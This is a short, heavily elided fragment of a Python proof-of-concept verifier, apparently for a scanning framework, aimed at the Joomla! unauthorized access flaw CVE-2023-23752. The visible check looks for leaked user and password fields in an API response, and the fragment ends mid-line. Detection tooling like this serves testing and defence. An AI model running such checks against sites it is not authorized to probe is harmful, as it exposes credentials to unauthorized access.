...
class POC(POCBase):
    _info = {
        ...
        "name": "Joomla! 未授权访问漏洞(CVE-2023-23752)",  # 漏洞名称
    ...
    def _verify(self):
        ...
        try:
            ...
            if "{\"links\":{" in req.text and "user" in req.text and "password" in req.text and req.status_code == 200 and "application/vnd.api+json" in \
